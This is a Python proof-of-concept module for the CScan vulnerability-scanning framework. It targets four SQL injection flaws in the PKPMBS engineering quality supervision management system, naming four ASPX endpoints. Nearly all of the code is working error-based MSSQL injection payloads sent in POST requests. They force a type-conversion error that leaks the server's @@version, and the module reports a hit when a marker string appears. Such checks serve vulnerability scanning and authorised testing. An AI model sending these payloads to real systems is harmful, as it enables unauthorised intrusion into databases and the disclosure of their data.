# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'PKPMBS_0018'  # 平台漏洞编号，留空
    name = 'PKPMBS工程质量监督站信息管理系统4处SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-20'  # 漏洞公布时间
    desc = '''
        PKPMBS是一个多功能工程质量监督站信息管理系统。
        PKPMBS工程质量监督站信息管理系统4处SQL注入漏洞：
        /pkpmbs/jdmanage/jdprojarchivesmenulist.aspx
        /pkpmbs/manager/userfolderlist.aspx 
        /INFOBLXX.aspx
        /userService/addresslist.aspx
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0121058'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PKPMBS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5fd9e9e0-7be7-4125-be30-98108ba92bd2'
    author = '国光'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg+"/pkpmbs/jdmanage/jdprojarchivesmenulist.aspx"
            post = "__keyword__=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version ))%20and%20%27%%27=%27"
            code, head, res, errcode, _ = hh.http(url, post)
            if code == 500 and "GAO JI@Microsoft SQL" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

            url = arg+"/pkpmbs/manager/userfolderlist.aspx"
            post = "username=1%27%20and%201=convert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B@@version%29%29%20and%20%27%%27=%27&cxbtn=%E6%9F%A5%E6%89%BE"
            code, head, res, errcode, _ = hh.http(url, post)
            if code == 500 and "GAOJIMicrosoft" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

            url = arg+"/INFOBLXX.aspx"
            post = "key=1%27%20and%201=convert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B@@version%29%29%20and%20%27%%27=%27&qtype=bljlwh"
            code, head, res, errcode, _ = hh.http(url, post)
            if code == 500 and "GAOJIMicrosoft" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

            url = arg+"/userService/addresslist.aspx"
            post = "keytype=username&keyword=1%27%20and%201=convert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B@@version%20%29%29%20and%20%27%%27=%27&Submit=%B2%E9++%D5%D2"
            code, head, res, errcode, _ = hh.http(url, post)
            if code == 500 and "GAOJIMicrosoft" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
